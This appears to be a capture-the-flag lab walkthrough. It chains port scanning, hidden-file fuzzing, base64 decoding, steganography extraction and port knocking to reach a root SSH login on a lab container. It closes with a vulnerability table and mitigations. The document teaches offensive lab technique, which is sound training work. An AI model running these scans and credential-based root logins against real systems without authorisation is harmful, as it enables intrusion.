## Recon

```bash
nmap -p- --open -sT -T3 -v -n TARGET_IP
```

Two ports open: `2222/tcp` and `8080/tcp`.

> Worth noting: nmap initially labels port 2222 as "EtherNetIP-1" — always verify with a version scan. Port 80 also appears but belongs to the host machine, not this container. Easy mistake in a shared-host lab.

```bash
nmap -sT -sC -sV -p 2222,8080 -v -n TARGET_IP
```

- **Port 2222 — SSH (OpenSSH 7.6p1, Ubuntu 18.04)**
- **Port 8080 — HTTP (nginx 1.14.0).** Root returns `403 Forbidden` — content exists, just not visible yet.

## Enumeration

### Directory fuzzing

```bash
gobuster dir -u http://TARGET_IP:8080 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

Results: `/images/`, `/0/` through `/15/` (16 numbered dirs), `/admin/`, `/notes/`, and `phpinfo.php` (200, ~58 KB) wide open.

`phpinfo.php` reveals PHP 7.1.33dev (EOL since December 2019), `cgi.fix_pathinfo=1` enabled, `disable_functions` empty. Useful recon but no immediate vector.

### Deeper fuzzing

```bash
gobuster dir -u http://TARGET_IP:8080/admin/ -w /usr/share/wordlists/dirb/big.txt -x txt,php -t 50
gobuster dir -u http://TARGET_IP:8080/notes/ -w /usr/share/wordlists/dirb/big.txt -x txt,php -t 50
```

- `/admin/admin.php` — 200, empty response.
- `/notes/note.txt` — content: `1 3 11`. Filing it away.

## Exploitation — first flag

### Hidden files in `/admin/`

Standard wordlists don't include dotfiles. Fix: prepend a dot to every entry:

```bash
sed 's/^/./' /usr/share/wordlists/dirb/big.txt > /tmp/big-hidden.txt
gobuster dir -u http://TARGET_IP:8080/admin/ -w /tmp/big-hidden.txt -x txt,php -t 50
```

Finds `.flag.txt` (200, 41 bytes).

```bash
curl http://TARGET_IP:8080/admin/.flag.txt
```

```
Flag 1: 58C250724441ED96979209921FAC3D89
```

## Privilege Escalation — second flag

The `1 3 11` string from `note.txt` connects four techniques.

### Step 1 — Decoding the numbered directories

```bash
curl -s http://TARGET_IP:8080/1/junk.txt  | base64 -d   # 1234_sec
curl -s http://TARGET_IP:8080/3/junk.txt  | base64 -d   # hoora!
curl -s http://TARGET_IP:8080/11/junk.txt | xxd -r -p   # california
```

> `hoora!` includes a trailing `!` that's very easy to miss. Always inspect raw bytes when dealing with passwords.

### Step 2 — Steganography

`/images/` contains 16 JPEG files. Numbers 1, 3, 11 map to images. The decoded strings are passphrases for `steghide`:

```bash
curl -s http://TARGET_IP:8080/images/1.jpg  -o /tmp/1.jpg
curl -s http://TARGET_IP:8080/images/3.jpg  -o /tmp/3.jpg
curl -s http://TARGET_IP:8080/images/11.jpg -o /tmp/11.jpg

steghide extract -sf /tmp/1.jpg  -p "1234_sec"   -f && cat s1   # user: root
steghide extract -sf /tmp/3.jpg  -p "hoora!"     -f && cat s2   # pass: !3QwX?j4
steghide extract -sf /tmp/11.jpg -p "california" -f && cat s3   # flag: /root/.hide/.last
```

### Step 3 — Port knocking

Port 2222 is now `filtered`. The `1 3 11` sequence must be sent in **reverse order**:

```bash
knock TARGET_IP 11 3 1
```

### Step 4 — SSH as root

The window is short — chain the knock and connection:

```bash
knock TARGET_IP 11 3 1 && sleep 1 && \
  sshpass -p '!3QwX?j4' ssh -p 2222 \
  -o StrictHostKeyChecking=no \
  root@TARGET_IP \
  "cat /root/.hide/.last/.flag.txt"
```

```
Flag 2: 5378aef8946e502ca645a55cbedc5661
```

## Vulnerability Summary

| ID | Vulnerability | CWE | CVSS v3.1 |
|---|---|---|---|
| V1 | `phpinfo.php` exposed in production | CWE-200 | — |
| V2 | Sensitive data in web-accessible hidden file | CWE-538 | — |
| V3 | Credentials stored as Base64 in public resource | CWE-256 | — |
| V4 | Security by obscurity (steganography as sole control) | CWE-656 | — |
| V5 | Direct SSH as root with password auth | CWE-250 | — |

---

## Mitigations

**V1:** Delete `phpinfo.php` from production.

**V2:** Store sensitive files outside the document root. Block dotfiles in nginx:
```nginx
location ~ /\. { deny all; }
```

**V3:** Base64 is encoding, not encryption. Never store credentials in public files.

**V4:** Combine port knocking with key-based SSH auth — never rely on obscurity alone.

**V5:** Disable `PermitRootLogin yes` in `sshd_config`. Use key-based authentication.
